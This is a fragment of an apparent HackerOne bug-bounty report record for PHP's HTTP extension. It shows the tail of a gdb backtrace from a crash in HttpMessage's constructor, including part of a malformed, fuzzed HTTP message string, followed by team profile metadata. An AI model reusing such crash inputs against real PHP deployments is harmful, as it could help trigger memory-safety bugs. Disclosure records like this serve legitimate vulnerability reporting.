'\\262' <repeats 20 times>, \"\u0572\", '\\262' <repeats 14 times>, \"\\260\\260A HTTP/1.1\\nA\\265_eptABCDEFGHI\", '\\262' <repeats 25 times>, \"TTP//X-Csrf-Token:1.0  HTTP/\\215.0\", len=<optimized out>, greedy=<optimized out>)\n        at /home/rc0r/tmp/php-src/ext/http/src/php_http_message.c:134\n    #5  0x000000000073c82d in zim_HttpMessage___construct (execute_data=<optimized out>, return_value=<optimized out>)\n        at /home/rc0r/tmp/php-src/ext/http/src/php_http_message.c:1061\n    #6  0x00000000008560f2 in ZEND_DO_FCALL_SPEC_HANDLER () at /home/rc0r/tmp/php-src/Zend/zend_vm_execute.h:842\n    #7  0x000000000081273b in execute_ex (ex=<optimized out>) at /home/rc0r/tmp/php-src/Zend/zend_vm_execute.h:414\n    #8  0x0000000000864567 in zend_execute (op_array=0x7ffff187d000, op_array@entry=0x7ffff185d860, return_value=return_value@entry=0x7ffff1813030)\n        at /home/rc0r/tmp/php-src/Zend/zend_vm_execute.h:458\n    #9  0x00000000007d4ee4 in zend_execute_scripts (type=type@entry=0x8, retval=0x7ffff1813030, retval@entry=0x0, file_count=file_count@entry=0x3)\n        at /home/rc0r/tmp/php-src/Zend/zend.c:1427\n    #10 0x0000000000778b90 in php_execute_script (primary_file=primary_file@entry=0x7fffffffd260) at /home/rc0r/tmp/php-src/main/main.c:2487\n    #11 0x0000000000866194 in do_cli (argc=0x2, argv=0x10448c0) at /home/rc0r/tmp/php-src/sapi/cli/php_cli.c:974\n    #12 0x0000000000443b98 in main (argc=0x2, argv=0x10448c0) at /home/rc0r/tmp/php-src/sapi/cli/php_cli.c:1350", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://www.php.net", 
            "about": "", 
            "twitter_handle": "", 
            "name": "PHP (IBB)"
        }, 
        "handle": "ibb-php", 
        "url": "https://hackerone.com/ibb-php", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/029/0a20311cece1ff1938eac3f9b09a6af056bc9e90_small.png?1385119730", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 29, 
        "default_currency": "usd"
    }, 
    "is_published": false
}